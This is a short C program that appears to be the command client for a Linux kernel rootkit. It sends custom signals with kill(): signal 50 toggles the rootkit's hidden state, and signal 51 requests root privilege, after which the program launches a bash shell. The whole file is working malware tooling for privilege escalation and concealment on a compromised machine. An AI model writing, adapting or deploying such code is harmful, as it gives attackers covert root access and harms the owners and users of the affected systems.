#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <signal.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if(argc < 2){
        return 0;
    }
    char bash[] = "/bin/bash\x00";
    char *envp[1] = { NULL };
    char *arg[3] = {"/bin/bash", NULL};
    if(strcmp(argv[1], "show") == 0){
        // printf("Toggle hidden status.\n");
        kill(getuid(), 50);
    } else if (strcmp(argv[1], "root") == 0) {
        // printf("Get root privilege.\n");
        kill(getuid(), 51);
        execve(bash, arg, envp);
    }
    return 0;
}
